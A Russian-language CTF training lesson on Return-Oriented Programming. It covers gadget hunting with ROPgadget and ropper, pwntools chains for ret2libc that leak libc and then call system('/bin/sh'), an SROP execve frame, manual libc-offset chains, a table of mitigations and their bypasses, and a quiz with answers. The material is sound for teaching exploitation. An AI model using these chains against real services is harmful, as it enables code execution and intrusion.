---
id: pwn-rop
title: "ROP: цепочки гаджетов и обход NX"
category: pwn
parent: pwn-buffer-overflow
difficulty: medium
order: 2
tags: [rop, gadgets, nx, ret2win, pop-rdi]
prerequisites: [pwn-buffer-overflow, pwn-pwntools]
useful_for:
  - "CTF Pwn категория"
  - "Обход NX/DEP"
  - "Vulnerability research"
estimated_minutes: 45
summary: "Осваиваем Return-Oriented Programming: находим гаджеты, строим цепочки вызовов и обходим неисполняемый стек (NX)."
---
ROP (Return-Oriented Programming) — техника обхода NX, при которой управление передаётся не на полезную нагрузку в стеке, а на короткие фрагменты существующего кода, заканчивающиеся инструкцией `ret`. Эти фрагменты («гаджеты») уже исполняемы, потому что лежат в сегменте кода, а мы лишь выстраиваем их адреса в стеке в нужном порядке. ROP превращает NX из барьера в неудобство и является базой для ret2libc, ret2csu, kernel ROP и сотен задач.

## Идея и почему это работает

Классический shellcode-инжект требует исполняемого стека. NX (`DEP`) помечает стек и кучу как `rw-`, поэтому переход на них вызывает `SIGSEGV`. Но сегмент `.text` по-прежнему `r-x`, и там лежат последовательности инструкций, заканчивающиеся `ret` (или `jmp`/`call` с эквивалентным эффектом). Если переполнить стек и вместо одного адреса возврата записать цепочку адресов гаджетов, каждый `ret` будет переходить к следующему гаджету. Так собирается произвольная программа из «кирпичиков» без единого байта нового кода.

Тьюринг-полнота ROP была доказана на практике: из гаджетов собирают циклы, ветвления, вызовы syscall. Но в CTF обычно нужно лишь вызвать `system('/bin/sh')` или `execve`.

## Гаджеты: что искать

Ключевые гаджеты для amd64 System V (аргументы: rdi, rsi, rdx, rcx, r8, r9):

| Гаджет | Зачем |
|---|---|
| `pop rdi; ret` | первый аргумент |
| `pop rsi; pop r15; ret` | второй аргумент |
| `pop rdx; ret` | третий аргумент |
| `pop rax; ret` | номер syscall |
| `syscall; ret` | выполнить syscall |
| `ret` | выравнивание стека |
| `leave; ret` | stack pivot |

Для 32-битного x86 аргументы передаются через стек: после адреса функции идут фиктивный адрес возврата и сами аргументы.

## Поиск гаджетов: ROPgadget, ropper, one_gadget

```bash
ROPgadget --binary ./chall | grep 'pop rdi ; ret'
ROPgadget --binary ./libc.so.6 --only 'pop|ret' | grep 'pop rdi'
ropper --file ./chall --search 'pop rdi; ret'
ropper --file ./chall --semantic --search 'xchg rax, rsp'
one_gadget ./libc.so.6
```

`ROPgadget` и `ropper` сканируют бинарь на последовательности, заканчивающиеся `ret`. `--only` ограничивает набор инструкций (быстрее и чище). `one_gadget` для libc ищет «one-shot»-гаджеты — адреса, попадание в которые при определённых условиях сразу даёт shell, минуя явный вызов `system`. Вывод `one_gadget`:

```
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL
```

Каждый one_gadget имеет constraints; их надо выполнить (или выбрать такой, чьи constraints уже выполняются).

## Сборка цепочки в pwntools

```python
from pwn import *
context.binary = elf = ELF('./chall')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())
payload = flat({OFFSET: rop.chain()})
```

`rop.dump()` печатает человекочитаемую цепочку:

```
0x0000:         0x40101a pop rdi; ret
0x0008:         0x402004 b'/bin/sh'
0x0010:         0x401030 system
```

Это бесценно для отладки: видно, какой гаджет встал на какое место. `rop.rdi` — готовый `pop rdi; ret`, `rop.ret` — `ret` для выравнивания, `rop.find_gadget([...])` — ручной поиск.

## ret2libc: вызов system из libc

```python
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
p.sendline(flat({OFFSET: rop.chain()}))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
p.sendline(flat({OFFSET: rop2.chain()}))
p.interactive()
```

Первый раунд печатает адрес `puts` из libc (утечка ASLR) и возвращается в `main`; второй раунд вызывает `system('/bin/sh')`. Здесь ROP-цепочка служит для подготовки аргументов и вызова.

## Тонкость: выравнивание и `ret`

Функции glibc используют SSE и требуют `rsp % 16 == 0` на входе. Часто перед вызовом `system` нужен лишний `ret`:

```python
payload = flat({OFFSET: [rop.find_gadget(['ret']).address] + rop.chain()})
```

Симптом отсутствия выравнивания — `SIGSEGV` на `movaps` внутри libc, при этом адреса верны.

## ROP без утечки: ret2csu и ret2dlresolve

Если в бинаре нет `pop rsi`/`pop rdx`, используйте `__libc_csu_init` (см. `pwn-ret2csu`) — там есть «универсальные» гаджеты для rdi/rsi/rdx. Если нужен вызов функции, которой нет в PLT, но есть уязвимый `read`, применяйте `ret2dlresolve` (`pwn-ret2dlresolve`), который заставляет динамический линкер разрешить произвольный символ.

## SROP: sigreturn-oriented programming

При нехватке гаджетов syscall `rt_sigreturn` (`rax=15`) восстанавливает ВСЕ регистры из подделанного фрейма на стеке. Это даёт мгновенный контроль над всеми регистрами одним гаджетом `syscall; ret`.

```python
frame = SigreturnFrame()
frame.rax = 59                 # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
payload = flat({OFFSET: [syscall_ret, 0xf, syscall_ret, frame]})
```

Подробнее — в `pwn-seccomp-srop`.

## Stack pivot: когда цепочка не влезает

Если переполнение короткое и не вмещает длинную цепочку, «переносите» стек в контролируемую область (`leave; ret` или `xchg rax, rsp; ret`). Об этом — в `pwn-stack-pivot`.

## Отладка цепочек

```bash
gdb ./chall
(gdb) b *0x401030          # точка на вызове
(gdb) run < payload
(gdb) x/8gx $rsp
(gdb) telescope $rsp
(gdb) ni
```

В pwndbg `rop` не встроен, но удобно ставить брейкпоинт на первый гаджет и смотреть `telescope $rsp`, чтобы убедиться, что стек указывает на следующий гаджет. Если `ret` уходит в мусор — где-то сбит порядок или оффсет.

## Митигации против ROP

| Защита | Что делает | Обход |
|---|---|---|
| NX/DEP | стек неисполняем | ROP и есть обход |
| ASLR | рандомизирует libc | утечка адреса |
| PIE | рандомизирует код | утечка/partial overwrite |
| CET shadow stack | проверяет возвраты | JOP/COOP, утечка и подмена shadow stack |
| CFI | проверяет косвенные вызовы | ограниченный набор целей |
| Full RELRO | GOT read-only | FSOP, hooks |

## Практический чек-лист

1. `checksec` — есть ли NX, PIE, canary.
2. Найти уязвимую функцию и оффсет (`cyclic`).
3. `ROPgadget`/`ropper` — есть ли `pop rdi; ret` и `pop rsi; ret`.
4. Есть `win`? → ret2win. Нет → утечка libc через `puts@plt(puts@got)`.
5. Собрать цепочку `ROP(elf)`/`ROP(libc)`, посмотреть `rop.dump()`.
6. Добавить `ret` при `movaps`-креше.
7. Протестировать локально, затем на удалённой цели.

## Справочные таблицы

| Инструмент | Команда |
|---|---|
| ROPgadget | `ROPgadget --binary ./chall --only 'pop\|ret'` |
| ropper | `ropper --file ./chall --search 'pop rdi; ret'` |
| one_gadget | `one_gadget ./libc.so.6` |
| pwntools | `ROP(elf).dump()` |

| Регистр | Аргумент |
|---|---|
| rdi | 1-й |
| rsi | 2-й |
| rdx | 3-й |
| rcx | 4-й |
| r8 | 5-й |
| r9 | 6-й |

## Что дальше / решение

ROP — мост от переполнения к реальной эксплуатации. Порядок изучения: `pwn-gadget-hunting` → `pwn-rop` (этот урок) → `pwn-ret2libc` → `pwn-ret2csu`/`pwn-ret2dlresolve` → `pwn-seccomp-srop`. Практика: возьмите любой бинарь с NX и соберите цепочку, печатающую `puts@got`; затем усложните до `system('/bin/sh')` и ORW под seccomp. Держите `rop.dump()` в каждом эксплойте — он экономит часы отладки.

## Ручная сборка цепочки без ROP(elf)

Иногда гаджеты берутся из libc (PIE-бинарь), и `ROP(elf)` не находит нужных последовательностей. Тогда собирайте вручную:

```python
pop_rdi = libc.address + 0x2a3e5
ret     = libc.address + 0x29139
binsh   = next(libc.search(b'/bin/sh'))
system  = libc.symbols['system']
payload = flat({OFFSET: [ret, pop_rdi, binsh, system]})
```

Смещения `0x2a3e5`/`0x29139` берутся из `ROPgadget --binary libc.so.6 --only 'pop|ret'`. После установки `libc.address` они складываются с базой. Всегда добавляйте `ret` перед `pop rdi`, если бинарь PIE и вход в цепочку не выровнен.

## Цепочки с несколькими вызовами

Чтобы вызвать несколько функций подряд (например, `read(0, bss, 100)` затем `system(bss)`), нужно вернуть управление в последовательность гаджетов, а не выходить из процесса. Между вызовами вставляйте гаджет `pop rdi; ret` с нужным аргументом. Для трёх и более аргументов без `pop rdx` используйте ret2csu или `__libc_csu_init`.

```python
rop = ROP(elf)
rop.call('read', [0, elf.bss(), 0x100])
rop.call('system', [elf.bss()])
```

`ROP.call` сам подставит `pop rdi`/`pop rsi`/`pop rdx`, если они есть в бинаре; иначе бросит ошибку — тогда переходите на ret2csu.

## JOP/COP и современные ограничения

CET (Control-flow Enforcement Technology) вводит shadow stack: аппаратный стек адресов возврата, который проверяет каждый `ret`. Классический ROP ломается, потому что подменённый адрес возврата не совпадает с shadow-копией. Обходы: JOP (переходы через `jmp`/`call` с валидными целями), COOP, либо утечка и подмена самого shadow stack. Об этом — в `pwn-cet-cfi`. На большинстве CTF-задач CET выключен, но в реальных системах его учитывают.

## Резюме по выбору техники

Если в бинаре есть `pop rdi; ret` и `pop rsi; ret` — собирайте цепочку напрямую через `ROP(elf)`. Если нет `pop rdx`, но есть `__libc_csu_init` — используйте ret2csu. Если нет ни `pop rdi`, ни вызова нужной функции в PLT, но есть уязвимый `read` — применяйте ret2dlresolve. Если гаджетов почти нет, но есть syscall — SROP. Если цепочка не влезает — stack pivot в `bss` или `environ`. Такой порядок выбора техники покрывает подавляющее большинство задач.

## Квиз

```quiz
- question: "Что такое ROP-gadget?"
  options:
    - "Отдельная функция в бинаре"
    - "Фрагмент кода, заканчивающийся `ret`, который можно использовать как строительный блок"
    - "Строка в .rodata"
    - "Адрес в GOT"
  answer: 1
- question: "Зачем нужен gadget `pop rdi; ret`?"
  options:
    - "Чтобы положить произвольное значение в RDI (первый аргумент)"
    - "Чтобы очистить RDI"
    - "Чтобы вернуться в main"
    - "Чтобы вызвать syscall"
  answer: 0
- question: "Почему при ROP в libc часто добавляют лишний `ret`?"
  options:
    - "Для обхода ASLR"
    - "Для выравнивания стека на 16 байт"
    - "Чтобы удлинить цепочку"
    - "Чтобы включить NX"
  answer: 1
- question: "В каком регистре передаётся номер системного вызова в x86-64?"
  options:
    - "RDI"
    - "RAX"
    - "RSI"
    - "R10"
  answer: 1
- question: "Что делает `rop.call('puts', [elf.got['puts']])`?"
  options:
    - "Вызывает puts с адресом GOT-записи puts (утечка libc)"
    - "Печатает содержимое GOT"
    - "Записывает в GOT"
    - "Удаляет puts из GOT"
  answer: 0
```

## Где пригодится

- **CTF Pwn:** NX включён почти всегда — ROP обязателен для ret2win с аргументами и leak-цепочек.
- **Реальный мир:** техника используется в эксплойтах ядра и userland для обхода DEP.
- **Bug bounty:** эксплуатация memory corruption в нативных сервисах при наличии NX.
- **Работа:** понимание ROP необходимо для анализа современных эксплойтов и защит (CFI, CET/shadow stack).
